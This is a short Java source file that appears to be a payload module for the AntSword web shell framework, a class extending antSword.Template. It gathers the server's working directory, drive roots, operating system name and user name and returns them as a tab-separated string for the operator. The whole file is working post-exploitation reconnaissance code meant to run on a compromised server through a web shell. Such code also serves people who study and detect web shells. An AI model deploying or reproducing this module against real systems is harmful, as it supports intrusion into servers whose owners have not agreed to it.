package base;

import antSword.Template;

import java.io.File;

public class Info extends Template {

    public String run() throws Exception {
        return this.SysInfoCode();
    }

    String SysInfoCode() {
        String d = System.getProperty("user.dir");
        String serverInfo = System.getProperty("os.name");
        String user = System.getProperty("user.name");
        String driverlist = this.WwwRootPathCode(d);
        return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
    }

    String WwwRootPathCode(String d) {
        StringBuilder s = new StringBuilder();
        if (!d.startsWith("/")) {
            try {
                File[] roots = File.listRoots();
                for (File root : roots) {
                    s.append(root.toString(), 0, 2);
                }
            } catch (Exception e) {
                s.append("/");
            }
        } else {
            s.append("/");
        }
        return s.toString();
    }

}
